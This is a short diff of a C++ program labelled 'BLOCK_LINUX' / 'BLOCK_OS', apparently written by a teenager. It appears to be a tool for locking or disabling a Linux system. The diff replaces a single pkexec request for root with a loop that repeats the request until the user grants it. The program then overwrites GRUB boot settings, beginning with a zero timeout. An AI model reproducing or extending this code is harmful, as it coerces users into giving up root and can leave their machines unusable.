@@ -4,7 +4,7 @@
 // SURNAME: Khudash  
 // AGE: 17
 
-// DATE: 23.11.2025
+// DATE: 03.01.2025
 // APP: BLOCK_LINUX
 // TYPE: BLOCK_OS
 // VERSION: LATEST
@@ -14,8 +14,8 @@
 #include <string>
 #include <iostream>
 #include <fstream>
-#include <unistd.h>
 #include <filesystem>
+#include <unistd.h>
 
 
 typedef std::string string;
@@ -39,13 +39,13 @@ void init(string current_path) {
         std::cerr << "DO NOT SUPPORT";
         return; 
     }
-
+    
     if (getuid() != 0) {
-        string get_root = "pkexec ";get_root += current_path;
-        system(get_root.c_str());
+        string query = "pkexec ";query += current_path;
+        while (system(query.c_str()) != 0);
         return;
     }
-
+    
     write_file(PATH_GRUB, R"(
 GRUB_DEFAULT=0
 GRUB_TIMEOUT=0
